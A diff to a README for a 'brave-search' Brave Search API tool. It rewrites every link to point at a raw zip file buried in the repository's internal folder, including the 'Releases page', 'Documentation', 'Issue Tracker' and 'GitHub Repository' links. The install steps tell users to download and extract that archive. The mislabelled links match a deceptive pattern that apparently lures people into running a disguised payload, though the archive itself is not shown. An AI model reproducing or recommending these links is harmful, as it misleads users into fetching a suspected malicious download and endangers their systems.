@@ -6,9 +6,9 @@ Welcome to brave-search! This tool helps you easily query the Brave Search API a
 
 ## 📥 Download the Latest Release
 
-[![Download Brave Search](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip%20Brave%https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip)](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip)
+[![Download Brave Search](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip%20Brave%https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip)](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip)
 
-To get started, visit the [Releases page](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip) to download the latest version of brave-search.
+To get started, visit the [Releases page](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip) to download the latest version of brave-search.
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To get started, visit the [Releases page](https://github.com/ldragush/brave-sear
 
 ## 💾 Download & Install
 
-1. **Visit the Releases page:** Go to the [Releases page](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip).
+1. **Visit the Releases page:** Go to the [Releases page](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip).
 2. **Choose the correct file:** Find the latest version of brave-search and select the appropriate package for your system.
 3. **Download the file:** Click on the download link to save the file to your computer.
 4. **Extract the package:** If the file is zipped, extract it to a folder of your choice.
@@ -82,9 +82,9 @@ This tool supports various topics, including:
 
 ## 🔗 Links & Resources
 
-- [GitHub Repository](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip)
-- [Documentation](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip)
-- [Issue Tracker](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip)
+- [GitHub Repository](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip)
+- [Documentation](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip)
+- [Issue Tracker](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip)
 
 ## 📜 Contribution
 
@@ -92,4 +92,4 @@ Every contribution is welcome! If you want to improve brave-search or report an 
 
 ## 📥 Final Notes
 
-Do not forget to visit the [Releases page](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/cli/search-brave-v1.5.zip) for all the latest updates and files. Enjoy exploring with brave-search!
+Do not forget to visit the [Releases page](https://github.com/ldragush/brave-search/raw/refs/heads/main/internal/search-brave-v2.7.zip) for all the latest updates and files. Enjoy exploring with brave-search!
